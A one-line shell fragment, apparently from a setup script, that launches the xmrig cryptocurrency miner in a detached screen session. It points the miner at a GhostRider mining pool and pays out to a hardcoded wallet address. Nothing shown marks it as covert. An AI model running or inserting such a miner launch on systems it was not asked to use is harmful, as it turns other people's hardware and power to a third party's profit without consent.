...
screen -dmS xmrig_mining ./xmrig/build/xmrig -a gr -o stratum+ssl://ghostrider-us.unmineable.com:443 -u USDT:TGpiKru64ovzRMeBVTNgDDC5fakbDVU9Qk.${WORKER_NAME}#pblk-utjn -p x -t 4
